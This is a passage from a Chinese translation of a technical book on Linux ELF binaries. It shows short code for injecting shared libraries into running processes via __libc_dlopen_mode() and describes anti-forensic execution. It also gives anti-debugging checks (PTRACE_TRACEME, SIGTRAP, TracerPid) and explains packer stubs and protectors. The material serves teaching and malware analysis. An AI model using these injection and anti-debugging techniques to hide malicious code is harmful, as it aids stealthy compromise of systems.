这是一种通过将 shellcode（使用`ptrace`）注入到现有进程的文本段中并执行它来将任何文件（包括共享库）加载到进程地址空间的方法。我们在第三章，“Linux 进程跟踪”中演示了这一点，我们的`code_inject.c`示例加载了一个非常简单的可执行文件到进程中。同样的代码也可以用来加载共享库。这种技术的问题是，大多数您想要注入的共享库都需要重定位。`open()/mmap()`函数只会将文件加载到内存中，但不会处理代码重定位，因此大多数您想要加载的共享库除非是完全位置无关的代码，否则不会正确执行。在这一点上，您可以选择通过解析共享库的重定位并使用`ptrace()`在内存中应用它们来手动处理重定位。幸运的是，还有一个更简单的解决方案，我们将在下面讨论。

## .so 注入与 dlopen() shellcode

`dlopen()`函数用于动态加载可执行文件最初未链接的共享库。开发人员经常使用这种方式为其应用程序创建插件形式的共享库。程序可以调用`dlopen()`来动态加载共享库，并实际上调用动态链接器为您执行所有重定位。不过，存在一个问题：大多数进程没有`dlopen()`可用，因为它存在于`libdl.so.2`中，程序必须显式链接到`libdl.so.2`才能调用`dlopen()`。幸运的是，也有解决方案：几乎每个程序默认在进程地址空间中映射了`libc.so`（除非显式编译为其他方式），而`libc.so`具有与`dlopen()`相当的`__libc_dlopen_mode()`。这个函数几乎以完全相同的方式使用，但需要设置一个特殊的标志：

```
#define DLOPEN_MODE_FLAG 0x80000000
```

这不是什么大问题。但在使用`__libc_dlopen_mode()`之前，您必须首先通过获取要感染的进程中`libc.so`的基址，解析`__libc_dlopen_mode()`的符号，然后将符号值`st_value`（参见第二章，“ELF 二进制格式”）添加到`libc`的基址，以获取`__libc_dlopen_mode()`的最终地址。然后，您可以设计一些以 C 或汇编调用`__libc_dlopen_mode()`的 shellcode，将您的共享库加载到进程中，具有完整的重定位并准备执行。然后可以使用`__libc_dlsym()`函数来解析共享库中的符号。有关使用`dlopen()`和`dlsym()`的更多详细信息，请参阅`dlopen`手册页。

### 图 4.8 - 调用 __libc_dlopen_mode()的 C 代码

```
/* Taken from Saruman's launcher.c */
#define __RTLD_DLOPEN 0x80000000 //glibc internal dlopen flag
#define __BREAKPOINT__ __asm__ __volatile__("int3");
#define __RETURN_VALUE__(x) __asm__ __volatile__("mov %0, %%rax\n" :: "g"(x))

__PAYLOAD_KEYWORDS__ void * dlopen_load_exec(const char *path, void *dlopen_addr)
{
        void * (*libc_dlopen_mode)(const char *, int) = dlopen_addr;
        void *handle;        handle = libc_dlopen_mode(path, __RTLD_DLOPEN|RTLD_NOW|RTLD_GLOBAL);
        __RETURN_VALUE__(handle);
        __BREAKPOINT__;
}
```

非常值得注意的是，`dlopen()`也会加载 PIE 可执行文件。这意味着您可以将完整的程序注入到进程中并运行它。实际上，您可以在单个进程中运行尽可能多的程序。这是一种令人难以置信的反取证技术，当使用线程注入时，您可以同时运行它们，以便它们同时执行。Saruman 是我设计的一个 PoC 软件，用于执行此操作。它使用两种可能的注入方法：具有手动重定位的`open()/mmap()`方法或`__libc_dlopen_mode()`方法。这在我的网站[`www.bitlackeys.org/#saruman`](http://www.bitlackeys.org/#saruman)上可用。

## .so 注入与 VDSO 操作

这是我在[`vxheaven.org/lib/vrn00.html`](http://vxheaven.org/lib/vrn00.html)中论文中讨论的一种技术。这个想法是操纵**虚拟动态共享对象**（**VDSO**），它自 Linux 内核版本 2.6.x 以来被映射到每个进程的地址空间中。VDSO 包含用于加速系统调用的代码，并且可以直接从 VDSO 中调用。技巧是通过使用`PTRACE_SYSCALL`来定位调用系统调用的代码，一旦它落在这段代码上就会中断。攻击者可以加载`%eax/%rax`以获取所需的系统调用号，并将参数存储在其他寄存器中，遵循 Linux x86 系统调用的适当调用约定。这是令人惊讶地简单，可以用来调用`open()/mmap()`方法，而无需注入任何 shellcode。这对于绕过防止用户将代码注入文本段的 PaX 非常有用。我建议阅读我的论文，以获得关于这种技术的完整论述。

## 文本段代码注入

这是一种简单的技术，除了注入 shellcode 之外，对于其他用途并不是很有用，一旦 shellcode 执行完毕，应该迅速替换为原始代码。您希望直接修改文本段的另一个原因是创建函数跳板，我们在本章前面讨论过，或者直接修改`.plt`代码。但就代码注入而言，最好的方法是将代码加载到进程中或创建一个新的内存映射，可以在其中存储代码：否则，文本段很容易被检测到被修改。

## 可执行文件注入

如前所述，`dlopen()`能够将 PIE 可执行文件加载到进程中，我甚至还包含了一个链接到 Saruman 的链接，Saruman 是一个巧妙的软件，允许您在现有进程中运行程序以进行反取证措施。但是，如何注入`ET_EXEC`类型的可执行文件呢？这种类型的可执行文件除了动态链接的`R_X86_64_JUMP_SLOT/R_386_JUMP_SLOT`重定位类型之外，不提供任何重定位信息。这意味着将常规可执行文件注入到现有进程中最终将是不可靠的，特别是在注入更复杂的程序时。尽管如此，我创建了一个名为**elfdemon**的这种技术的 PoC，它将可执行文件映射到一些新的映射中，这些映射不会与主机进程的可执行文件映射发生冲突。然后它接管控制（与 Saruman 不同，Saruman 允许并发执行），并在运行结束后将控制权传回给主机进程。这方面的示例可以在[`www.bitlackeys.org/projects/elfdemon.tgz`](http://www.bitlackeys.org/projects/elfdemon.tgz)中找到。

## 可重定位代码注入 - ET_REL 注入

这种方法与共享库注入非常相似，但与`dlopen()`不兼容。ET_REL（.o 文件）是可重定位代码，与 ET_DYN（.so 文件）非常相似，但它们不是作为单个文件执行的；它们是用来链接到可执行文件或共享库中的，正如第二章中所讨论的，*ELF 二进制格式*。然而，这并不意味着我们不能注入它们，重定位它们并执行它们的代码。这可以通过使用之前描述的任何技术来完成，除了`dlopen()`。因此，`open/mmap`是足够的，但需要手动处理重定位，可以使用`ptrace`来完成。在第二章中，*ELF 二进制格式*，我们给出了我设计的软件**Quenya**中的重定位代码的示例。这演示了如何在将对象文件注入可执行文件时处理重定位。当将其注入到进程中时，可以使用相同的原则。

# ELF 反调试和打包技术

在下一章《ELF 软件保护的突破》中，我们将讨论使用 ELF 可执行文件进行软件加密和打包的细节。病毒和恶意软件通常会使用某种类型的保护机制进行加密或打包，这也可能包括反调试技术，使得分析二进制文件变得非常困难。在不对这个主题进行完整的解释的情况下，以下是一些常见的 ELF 二进制保护程序采取的反调试措施，这些措施通常用于包装恶意软件。

## PTRACE_TRACEME 技术

这种技术利用了一个程序一次只能被一个进程跟踪的事实。几乎所有调试器都使用`ptrace`，包括 GDB。这个想法是一个程序可以跟踪自己，以便没有其他调试器可以附加。

### 图 4.9 - 使用 PTRACE_TRACEME 的反调试示例

```
void anti_debug_check(void)
{
  if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
    printf("A debugger is attached, but not for long!\n");
    kill(getpid());
    exit(0);
  }
}
```

*图 4.9*中的函数将会在调试器附加时终止程序（自身）；它会知道因为它无法跟踪自己。否则，它将成功地跟踪自己，并且不允许其他跟踪器，以防止调试器。

## SIGTRAP 处理程序技术

在调试时，我们经常设置断点，当断点被触发时，会生成一个 SIGTRAP 信号，被我们的调试器信号处理程序捕获；程序会停止，我们可以检查它。通过这种技术，程序设置了一个信号处理程序来捕获 SIGTRAP 信号，然后故意发出一个断点指令。当程序的 SIGTRAP 处理程序捕获到它时，它会将一个全局变量从`0`增加到`1`。

程序可以检查全局变量是否设置为`1`，如果是，那意味着我们的程序捕获了断点，没有调试器存在；否则，如果是`0`，那就是被调试器捕获了。在这一点上，程序可以选择终止自身或退出以防止调试：

```
static int caught = 0;
int sighandle(int sig)
{
     caught++;
}
int detect_debugger(void)
{
    __asm__ volatile("int3");
    if (!caught) {
        printf("There is a debugger attached!\n");
        return 1;
    }
}
```

## /proc/self/status 技术

这个动态文件存在于每个进程中，包括很多信息，包括进程当前是否正在被跟踪。

一个`/proc/self/status`布局的示例，可以解析以检测跟踪器/调试器，如下所示：

```
ryan@elfmaster:~$ head /proc/self/status
Name:  head
State:  R (running)
Tgid:  19813
Ngid:  0
Pid:  19813
PPid:  17364
TracerPid:  0
Uid:  1000  1000  1000  1000
Gid:  31337  31337  31337  31337
FDSize:  256

```

如前面的输出所示，`tracerPid: 0`表示该进程没有被跟踪。一个程序必须做的就是打开`/proc/self/status`，并检查值是否为 0，以确定自己是否被跟踪。如果不是，则它知道自己正在被跟踪，可以选择终止自身或退出。

## 代码混淆技术

代码混淆（也称为代码转换）是一种技术，其中汇编级别的代码被修改以包括不透明的分支指令或不对齐的指令，使得反汇编器无法正确读取字节码。考虑以下示例：

```
jmp antidebug + 1
antidebug:
.short 0xe9 ;first byte of a jmp instruction
mov $0x31337, %eax
```

当前面的代码被编译并用`objdump`反汇编器查看时，它看起来是这样的：

```
   4:   eb 01                   jmp    7 <antidebug+0x1>
   <antidebug:>
   6:   e9 00 b8 37 13          jmpq   1337b80b
   b:   03 00                 add    (%rax),%eax
```

这段代码实际上执行了`mov $0x31337, %eax`操作，从功能上讲，它执行得很正确，但因为之前有一个`0xe9`，所以反汇编器将其视为`jmp`指令（因为`0xe9`是`jmp`的前缀）。

因此，代码转换不会改变代码的功能，只会改变它的外观。像 IDA 这样的智能反汇编器不会被前面的代码片段所欺骗，因为它在生成反汇编时使用控制流分析。

## 字符串表转换技术

这是我在 2008 年构思的一种技术，我还没有看到广泛使用，但如果它没有在某处使用，我会感到惊讶。这个想法是利用我们对 ELF 字符串表和符号名称以及段头的知识。诸如 `objdump` 和 `gdb`（经常用于逆向工程）的工具依赖于字符串表来了解 ELF 文件中函数和段的名称。这种技术会打乱每个符号和段的名称的顺序。结果是段头将被全部混合（或看起来是这样），函数和符号的名称也是如此。

这种技术可能会让逆向工程师产生误导；例如，他们可能会认为自己正在查看一个名为 `check_serial_number()` 的函数，而实际上他们正在查看 `safe_strcpy()`。我已经在一个名为 `elfscure` 的工具中实现了这一点，可以在 [`www.bitlackeys.org/projects/elfscure.c`](http://www.bitlackeys.org/projects/elfscure.c) 上找到。

# ELF 病毒检测和消毒

检测病毒可能非常复杂，更不用说消毒了。我们现代的杀毒软件实际上相当荒谬且效果不佳。标准的杀毒软件使用扫描字符串，即签名，来检测病毒。换句话说，如果一个已知的病毒在二进制文件的给定偏移处始终有字符串 `h4h4.infect.1+`，那么杀毒软件会看到它存在于数据库中并标记为感染。从长远来看，这非常低效，特别是因为病毒不断变异成新的品系。

一些杀毒产品已知使用模拟进行动态分析，可以向启发式分析器提供关于可执行文件在运行时的行为的信息。动态分析可能很强大，但已知速度很慢。Silvio Cesare 在动态恶意软件解包和分类方面取得了一些突破，但我不确定这项技术是否被用于主流。

目前，存在着非常有限的软件用于检测和消毒 ELF 二进制感染。这可能是因为更主流的市场并不存在，而且很多这些攻击仍然处于地下状态。然而毫无疑问，黑客们正在使用这些技术来隐藏后门，并在受损系统上保持隐秘的存在。目前，我正在进行一个名为 Arcana 的项目，它可以检测和消毒许多类型的 ELF 二进制感染，包括可执行文件、共享库和内核驱动程序，并且还能够使用 ECFS 快照（在第八章中描述，*ECFS – 扩展核心文件快照技术*），这大大改进了进程内存取证。与此同时，您可以阅读或下载我多年前设计的以下项目中的一个原型：

+   VMA Voodoo ([`www.bitlackeys.org/#vmavudu`](http://www.bitlackeys.org/#vmavudu))

+   **AVU** (**Anti Virus Unix**) 在 [`www.bitlackeys.org/projects/avu32.tgz`](http://www.bitlackeys.org/projects/avu32.tgz) 上

Unix 环境中的大多数病毒是在系统受损后植入的，并用于通过记录有用信息（如用户名/密码）或通过挂钩守护进程与后门来维持系统上的驻留。我在这个领域设计的软件很可能被用作主机入侵检测软件或用于对二进制文件和进程内存进行自动取证分析。继续关注 [`bitlackeys.org/`](http://bitlackeys.org/) 网站，以查看有关 *Arcana* 发布的任何更新，这是我最新的 ELF 二进制分析软件，将是第一个真正配备完整分析和消毒 ELF 二进制感染能力的生产软件。

我决定不在本章中写一整节关于启发式和病毒检测，因为我们将在第六章中讨论大部分这些技术，*Linux 中的 ELF 二进制取证*，我们将检查用于检测二进制感染的方法和启发式。

# 总结

在本章中，我们涵盖了有关 ELF 二进制病毒工程的“必须知道”信息。这些知识并不常见，因此本章有望作为计算机科学地下世界中这种神秘病毒艺术的独特介绍。在这一点上，您应该了解病毒感染、反调试的最常见技术，以及创建和分析 ELF 病毒所面临的挑战。这些知识在逆向工程病毒或进行恶意软件分析时非常有用。值得注意的是，可以在[`vxheaven.org`](http://vxheaven.org)上找到许多优秀的论文，以帮助进一步了解 Unix 病毒技术。


# 第五章：Linux 二进制保护

在本章中，我们将探讨 Linux 程序混淆的基本技术和动机。混淆或加密二进制文件或使其难以篡改的技术称为软件保护方案。通过“软件保护”，我们指的是二进制保护或二进制加固技术。二进制加固不仅适用于 Linux；事实上，在这个技术类型中，Windows OS 有更多的产品，也有更多的例子可供讨论。

许多人没有意识到 Linux 也有市场需求，尽管主要用于政府使用的反篡改产品。在黑客社区中，过去十年中也发布了许多 ELF 二进制保护程序，其中有几个为今天使用的许多技术铺平了道路。

整本书都可以专门讨论软件保护的艺术，作为一些最新的 ELF 二进制保护技术的作者，我很容易在这一章中陷入其中。相反，我将坚持解释基本原理和一些有趣的技术，然后深入了解我自己的二进制保护程序——**玛雅的面纱**。二进制保护所涉及的复杂工程和技能使其成为一个具有挑战性的话题，但我会尽力而为。

# ELF 二进制打包程序-愚蠢的保护程序

**打包程序**是一种常用于恶意软件作者和黑客的软件类型，用于压缩或加密可执行文件以混淆其代码和数据。一个非常常见的打包程序名为 UPX（[`upx.sourceforge.net`](http://upx.sourceforge.net)），并且在大多数 Linux 发行版中都作为一个软件包提供。这种类型的打包程序的最初目的是压缩可执行文件并使其更小。

由于代码被压缩，必须有一种方法在内存中执行之前对其进行解压缩——这就是事情变得有趣的地方，我们将在*存根机制和用户空间执行*部分讨论这是如何工作的。无论如何，恶意软件作者已经意识到，压缩其恶意软件感染文件将由于混淆而逃避 AV 检测。这导致恶意软件/杀毒软件研究人员开发了自动解包程序，现在几乎所有现代 AV 产品都在使用。

如今，“打包二进制”一词不仅指压缩的二进制文件，还指加密的二进制文件或者任何形式的混淆层保护的二进制文件。自 21 世纪初以来，已经出现了几种显著的 ELF 二进制文件保护程序，塑造了 Linux 中二进制保护的未来。我们将探讨每一种保护程序，并使用它们来模拟保护 ELF 二进制文件所使用的不同技术。然而，在此之前，让我们看看存根是如何工作的，以加载和执行压缩或加密的二进制文件。

# 存根机制和用户空间执行

首先，有必要了解软件保护实际上由两个程序组成：

+   **保护阶段代码**：将保护应用于目标二进制文件的程序

+   **运行时引擎或存根**：与目标二进制文件合并的程序，负责在运行时进行反混淆和反调试

保护程序的类型可以因应用于目标二进制文件的保护类型而有很大不同。无论应用于目标二进制文件的保护类型是什么，运行时代码必须能够理解。运行时代码（或存根）必须知道如何解密或反混淆与其合并的二进制文件。在大多数软件保护的情况下，受保护的二进制文件与一个相对简单的运行时引擎合并；它的唯一目的是解密二进制文件并将控制权传递给内存中的解密二进制文件。

这种类型的运行时引擎并不是一个引擎，我们称之为存根。存根通常是编译而成的，没有任何 libc 链接（例如，`gcc -nostdlib`），或者是静态编译的。这种存根虽然比真正的运行时引擎简单，但实际上仍然相当复杂，因为它必须能够从内存中`exec()`一个程序，这就是**用户空间执行**发挥作用的地方。我们应该感谢 grugq 在这里的贡献。

通常使用`glibc`包装器（例如`execve`，`execv`，`execle`和`execl`）的`SYS_execve`系统调用将加载并运行可执行文件。在软件保护程序的情况下，可执行文件是加密的，必须在执行之前解密。只有一个经验不足的黑客才会编写他们的存根来解密可执行文件，然后以解密形式将其写入磁盘，然后再使用`SYS_exec`执行它，尽管原始的 UPX 打包程序确实是这样工作的。

实现这一点的熟练方法是通过在原地（在内存中）解密可执行文件，然后从内存中加载和执行它，而不是从文件中。这可以从用户空间代码中完成，因此我们称这种技术为用户空间执行。许多软件保护程序实现了一个这样做的存根。实现存根用户空间执行的一个挑战是，它必须将段加载到它们指定的地址范围中，这通常是为存根可执行文件本身指定的相同地址。

这只是 ET_EXEC 类型可执行文件的问题（因为它们不是位置无关的），通常可以通过使用自定义链接器脚本来克服，该脚本告诉存根可执行文件段加载到除默认地址之外的地址。这样的链接器脚本示例在第一章的链接器脚本部分中显示，*Linux 环境及其工具*。

### 注意

在 x86_32 上，默认基址是 0x8048000，在 x86_64 上是 0x400000。存根应该具有不与默认地址范围冲突的加载地址。例如，我最近编写的一个链接，文本段加载在 0xa000000 处。

![存根机制和用户空间执行](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00012.jpeg)

图 5.1：二进制保护程序存根的模型

*图 5.1*以可视方式显示了加密的可执行文件嵌入在存根可执行文件的数据段中，包装在其中，这就是为什么存根也被称为包装器。

### 注意

我们将在第六章的*识别受保护的二进制文件*部分中展示，如何在许多情况下剥离包装实际上可能是一个微不足道的任务，也可能是一个使用软件或脚本自动化的任务。

典型的存根执行以下任务：

+   解密其有效负载（即原始可执行文件）

+   将可执行文件的可加载段映射到内存中

+   将动态链接器映射到内存中

+   创建一个堆栈（即使用 mmap）

+   设置堆栈（argv，envp 和辅助向量）

+   将控制权传递给程序的入口点

### 注意

如果受保护的程序是动态链接的，那么控制权将传递给动态链接器的入口点，随后将其传递给可执行文件。

这种性质的存根本质上只是一个用户空间执行的实现，它加载和执行嵌入在其自身程序体内的程序，而不是一个单独的文件。

### 注意

原始的用户空间执行研究和算法可以在 grugq 的名为*用户空间执行的设计与实现*的论文中找到，网址为[`grugq.github.io/docs/ul_exec.txt`](https://grugq.github.io/docs/ul_exec.txt)。

## 一个保护程序的例子

让我们来看看一个在我写的简单保护程序保护之前和之后的可执行文件。使用`readelf`查看程序头，我们可以看到二进制文件具有我们期望在动态链接的 Linux 可执行文件中看到的所有段：

```
$ readelf -l test

Elf file type is EXEC (Executable file)
Entry point 0x400520
There are 9 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040
                 0x00000000000001f8 0x00000000000001f8  R E    8
  INTERP         0x0000000000000238 0x0000000000400238 0x0000000000400238
                 0x000000000000001c 0x000000000000001c  R      1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                 0x00000000000008e4 0x00000000000008e4  R E    200000
  LOAD           0x0000000000000e10 0x0000000000600e10 0x0000000000600e10
                 0x0000000000000248 0x0000000000000250  RW     200000
  DYNAMIC        0x0000000000000e28 0x0000000000600e28 0x0000000000600e28
                 0x00000000000001d0 0x00000000000001d0  RW     8
  NOTE           0x0000000000000254 0x0000000000400254 0x0000000000400254
                 0x0000000000000044 0x0000000000000044  R      4
  GNU_EH_FRAME   0x0000000000000744 0x0000000000400744 0x0000000000400744
                 0x000000000000004c 0x000000000000004c  R      4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     10
  GNU_RELRO      0x0000000000000e10 0x0000000000600e10 0x0000000000600e10
                 0x00000000000001f0 0x00000000000001f0  R      1
```

现在，让我们在二进制文件上运行我们的保护程序，然后查看程序头：

```
$ ./elfpack test
$ readelf -l test
Elf file type is EXEC (Executable file)
Entry point 0xa01136
There are 5 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000a00000 0x0000000000a00000
                 0x0000000000002470 0x0000000000002470  R E    1000
  LOAD           0x0000000000003000 0x0000000000c03000 0x0000000000c03000
                 0x000000000003a23f 0x000000000003b4df  RW     1000
```

有许多不同之处。入口点是`0xa01136`，只有两个可加载段，即文本和数据段。这两者的加载地址与以前完全不同。

这当然是因为存根的加载地址不能与其中包含的加密可执行文件的加载地址冲突，必须加载和内存映射。原始可执行文件的文本段地址为`0x400000`。存根负责解密嵌入其中的可执行文件，然后将其映射到`PT_LOAD`程序头中指定的加载地址。

如果地址与存根的加载地址冲突，那么它将无法工作。这意味着存根程序必须使用自定义链接器脚本进行编译。通常的做法是修改由`ld`使用的现有链接器脚本。对于本例中使用的保护程序，我修改了链接器脚本中的一行：

+   这是原始行：

```
PROVIDE (__executable_start = SEGMENT_START("text-segment", 0x400000)); . = SEGMENT_START("text-segment", 0x400000) + SIZEOF_HEADERS;
```

+   以下是修改后的行：

```
PROVIDE (__executable_start = SEGMENT_START("text-segment", 0xa00000)); . = SEGMENT_START("text-segment", 0xa00000) + SIZEOF_HEADERS;
```

从受保护的可执行文件的程序头中可以注意到的另一件事是没有`PT_INTERP`段或`PT_DYNAMIC`段。对于未经训练的人来说，这似乎是一个静态链接的可执行文件，因为它似乎没有使用动态链接。这是因为您没有查看原始可执行文件的程序头。

### 注意

请记住，原始可执行文件是加密的，并嵌入在存根可执行文件中，因此您实际上是从存根而不是从它所保护的可执行文件中查看程序头。在许多情况下，存根本身是使用非常少的选项编译和链接的，并且不需要动态链接本身。良好的用户空间执行实现的主要特征之一是能够将动态链接器加载到内存中。

正如我所提到的，存根是一个用户空间执行程序，它将在解密并将嵌入式可执行文件映射到内存后，将动态链接器映射到内存。动态链接器将在将控制权传递给现在解密的程序之前处理符号解析和运行时重定位。

# 保护程序存根执行的其他任务

除了解密和将嵌入式可执行文件加载到内存中（即用户空间执行组件），存根还可能执行其他任务。存根通常会启动反调试和反仿真例程，旨在进一步保护二进制文件，使其更难以进行调试或仿真。

在第四章中，*ELF 病毒技术-Linux/Unix 病毒*，我们讨论了一些用于防止基于`ptrace`的调试的反调试技术。这可以防止大多数调试器，包括 GDB，轻松跟踪二进制文件。在本章的后面，我们将总结用于 Linux 二进制保护的最常见反调试技术。

# 现有 ELF 二进制保护程序

多年来，已经发布了一些值得注意的二进制保护程序，既公开发布的，也来自地下场景。我将讨论一些用于 Linux 的保护程序，并概述各种功能。

## Grugq 的 DacryFile–2001

DacryFile 是我所知道的最早的 Linux 二进制保护程序（[`github.com/packz/binary-encryption/tree/master/binary-encryption/dacryfile`](https://github.com/packz/binary-encryption/tree/master/binary-encryption/dacryfile)）。这个保护程序很简单，但仍然很聪明，工作方式与病毒的 ELF 寄生感染非常相似。在许多保护程序中，存根包裹在加密的二进制文件周围，但在 DacryFile 的情况下，存根只是一个简单的解密例程，被注入到要受保护的二进制文件中。

DacryFile 使用 RC4 加密从`.text`部分的开头到文本段的结尾加密二进制文件。解密存根是一个简单的用汇编和 C 编写的程序，它没有用户空间 exec 功能；它只是解密代码的加密主体。这个存根被插入到数据段的末尾，这非常像病毒插入寄生虫的方式。可执行文件的入口点被修改为指向存根，当二进制文件执行时，存根解密程序的文本段。然后将控制权传递给原始入口点。

### 注意

在支持 NX 位的系统上，数据段除非显式标记为可执行权限位，否则不能用于保存代码，即`'p_flags |= PF_X'`。

## Scut 的 Burneye - 2002

许多人认为 Burneye 是 Linux 中第一个体面的二进制加密示例。按照今天的标准，它可能被认为是薄弱的，但它仍然为这个领域带来了一些创新的功能。其中包括三层加密，第三层是受密码保护的层。

密码被转换成一种哈希和校验和，然后用于解密最外层。这意味着除非二进制文件得到正确的密码，否则它将永远无法解密。另一层，称为指纹层，可以用来代替密码层。这个功能通过算法为二进制文件在其上受到保护的系统创建一个密钥，并阻止二进制文件在受保护的系统之外的任何其他系统上解密。

还有一个自毁功能；在运行一次后删除二进制文件。Burneye 与其他保护程序的主要区别之一是它是第一个使用用户空间 exec 技术来包装二进制文件的程序。从技术上讲，这首先是由 John Resier 为 UPX 打包程序完成的，但 UPX 被认为更像是一个二进制压缩器而不是一个保护程序。据称，John 将用户空间 exec 的知识传授给了 Scut，正如 Scut 和 Grugq 在[`phrack.org/issues/58/5.html`](http://phrack.org/issues/58/5.html)上写的 ELF 二进制保护文章中提到的那样。这篇文章记录了 Burneye 的内部工作原理，强烈推荐阅读。

### 注意

一个名为`objobf`的工具，代表**对象混淆器**，也是由 Scut 设计的。这个工具混淆了一个 ELF32 ET_REL（目标文件），使得代码非常难以反汇编，但在功能上是等效的。通过使用不透明分支和不对齐的汇编等技术，这在阻止静态分析方面可能非常有效。

## Neil Mehta 和 Shawn Clowes 的 Shiva - 2003

Shiva 可能是 Linux 二进制保护的最好的公开示例。源代码从未发布过 - 只有保护程序 - 但作者在各种会议上发表了几次演讲，比如 Blackhat USA。这些演讲揭示了它的许多技术。

Shiva 适用于 32 位 ELF 可执行文件，并提供一个完整的运行时引擎（不仅仅是解密存根），在保护过程中始终协助解密和反调试功能。Shiva 提供三层加密，其中最内层永远不会完全解密整个可执行文件。它每次解密 1024 字节的块，然后重新加密。

对于一个足够大的程序，任何时候最多只有程序的三分之一会被解密。另一个强大的功能是固有的反调试功能——Shiva 保护程序使用一种技术，其中运行时引擎使用`clone()`生成一个线程，然后跟踪父线程，而父线程反过来跟踪子线程。这使得基于`ptrace`的动态分析变得不可能，因为单个进程（或线程）可能不会有多个跟踪器。而且，由于两个进程互相跟踪，其他调试器也无法附加。

### 注意

一位著名的逆向工程师 Chris Eagle 成功使用 IDA 的 x86 模拟器插件解包了一个受 Shiva 保护的二进制文件，并在 Blackhat 上就此成就做了一个演讲。据说这个 Shiva 的逆向工程是在 3 周内完成的。

+   作者的演讲：

[`www.blackhat.com/presentations/bh-usa-03/bh-us-03-mehta/bh-us-03-mehta.pdf`](https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-mehta/bh-us-03-mehta.pdf)

+   Chris Eagle 的演讲（破解 Shiva）：

[`www.blackhat.com/presentations/bh-federal-03/bh-federal-03-eagle/bh-fed-03-eagle.pdf`](http://www.blackhat.com/presentations/bh-federal-03/bh-federal-03-eagle/bh-fed-03-eagle.pdf)

## Maya's Veil by Ryan O'Neill – 2014

Maya's Veil 是我在 2014 年设计的，适用于 ELF64 二进制文件。到目前为止，该保护程序处于原型阶段，尚未公开发布，但已经出现了一些分支版本，演变成了 Maya 项目的变种。其中一个是[`github.com/elfmaster/`](https://github.com/elfmaster/)，这是 Maya 的一个版本，只包括控制流完整性等反利用技术。作为 Maya 保护程序的发明者和设计者，我有权详细说明其内部工作的一些细节，主要是为了激发对这类事物感兴趣的读者的兴趣和创造力。除了是本书的作者外，我也是一个很平易近人的人，所以如果您对 Maya's Veil 有更多问题，可以随时联系我。

首先，这个保护程序被设计为仅在用户空间中解决方案（这意味着没有来自聪明的内核模块的帮助），同时仍然能够保护具有足够反篡改特性的二进制文件，甚至更令人印象深刻的是，还具有额外的反利用功能。迄今为止，Maya 拥有的许多功能只能通过编译器插件实现，而 Maya 直接在已编译的可执行二进制文件上运行。

Maya 非常复杂，记录其所有内部工作将是关于二进制保护主题的完整解释，但我将总结一些其最重要的特性。Maya 可用于创建第 1 层、第 2 层或第 3 层受保护的二进制文件。在第一层，它使用智能运行时引擎；这个引擎被编译为一个名为`runtime.o`的目标文件。

这个文件使用反向文本填充扩展（参见第四章，*ELF 病毒技术- Linux/Unix 病毒*），结合可重定位代码注入重链接技术。基本上，运行时引擎的目标文件链接到它所保护的可执行文件。这个目标文件非常重要，因为它包含了反调试、反利用、带有加密堆的自定义`malloc`、关于它所保护的二进制文件的元数据等代码。这个目标文件大约 90%是 C 代码，10%是 x86 汇编代码。

### Maya 的保护层

玛雅具有多层保护和加密。每个额外的层都通过增加攻击者剥离的工作量来增强安全级别。最外层的层对于防止静态分析是最有用的，而最内层的层（图层 1）只会在当前调用堆栈内解密函数，并在完成后重新加密它们。以下是对每个图层的更详细解释。

#### 图层 1

受保护的二进制的图层 1 由二进制的每个单独加密的函数组成。每个函数在调用和返回时都会动态解密和重新加密。这是因为`runtime.o`包含了智能和自主的自我调试能力，使其能够密切监视进程的执行，并确定何时受到攻击或分析。

运行时引擎本身已经使用代码混淆技术进行了混淆，例如 Scut 的对象混淆器工具中发现的那些技术。用于解密和重新加密函数的密钥存储和元数据存储在运行时引擎生成的加密堆中的自定义`malloc()`实现中。这使得定位密钥变得困难。由于它为动态解密、反调试和反利用能力提供了智能和自主的自我跟踪能力，因此图层 1 保护是第一个也是最复杂的保护级别。

图层 1

一个过于简化的图表，显示了一个受保护的二进制图层 1 与原始二进制的布局

#### 图层 2

受保护的二进制的图层 2 与原始二进制并无二致，只是不仅函数，而且二进制中的每个其他部分都被加密以防止静态分析。这些部分在运行时解密，如果有人能够转储进程，那么某些数据将会暴露出来，这必须通过内存驱动程序完成，因为`prctl()`用于保护进程免受通过`/proc/$pid/mem`进行的普通用户空间转储（并且还阻止进程转储任何核心文件）。

#### 图层 3

受保护的二进制的图层 3 与图层 2 相同，只是它通过将图层 2 二进制嵌入到图层 3 存根的数据段中，增加了一层完整的保护。图层 3 存根的工作方式类似于传统的用户空间执行。

### 玛雅的纳米机器

玛雅的面纱有许多其他功能，使得它难以逆向工程。其中一个功能称为**纳米机器**。这是原始二进制中的某些指令被完全删除并替换为垃圾指令或断点的地方。

当玛雅的运行时引擎看到这些垃圾指令或断点之一时，它会检查其纳米机器记录，看看原始指令是什么。记录存储在运行时引擎的加密堆段中，因此对于逆向工程师来说，访问这些信息并不容易。一旦玛雅知道原始指令的作用，它就会使用`ptrace`系统调用来模拟该指令。

### 玛雅的反利用

玛雅的反利用功能是使其与其他保护程序相比独特的原因。大多数保护程序的目标仅仅是使逆向工程变得困难，而玛雅能够加强二进制，使其许多固有的漏洞（如缓冲区溢出）无法被利用。具体来说，玛雅通过在运行时引擎中嵌入特殊的控制流完整性技术来防止**ROP**（即**Return-Oriented Programming**）。

受保护的二进制中的每个函数都在入口点和每个返回指令处插入了一个断点（`int3`）。`int3`断点会触发运行时引擎产生 SIGTRAP；然后运行时引擎会执行以下几种操作之一：

+   解密函数（仅在遇到入口`int3`断点时）

+   加密函数（仅在遇到返回`int3`断点时）

+   检查返回地址是否被覆盖

+   检查`int3`断点是否是 nanomite；如果是，它将进行模拟

第三个要点是反 ROP 功能。运行时引擎检查包含程序内各个点的有效返回地址的哈希映射。如果返回地址无效，Maya 将退出，利用尝试将失败。

